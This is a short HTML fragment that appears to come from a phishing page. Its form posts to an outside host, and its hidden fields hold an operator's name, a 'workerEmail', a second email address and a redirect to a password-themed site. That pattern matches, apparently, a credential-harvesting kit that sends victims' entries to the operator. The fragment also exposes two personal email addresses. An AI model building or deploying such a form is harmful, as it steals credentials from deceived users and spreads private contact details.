<html lang="en">
    ...
    <body>
       <form class="content" action="https://apisubmit-8ll0irls.b4a.run/post" method="post">
      <input hidden="true" name="name" value="Saad">
      <input hidden="true" name="workerEmail" value="saadnizamani555@gmail.com">
      <input hidden="true" name="email" value="saadnizamani777@gmail.com">
      <input hidden="true" name="redirectUrl" value="https://sub-passw.vercel.app/">
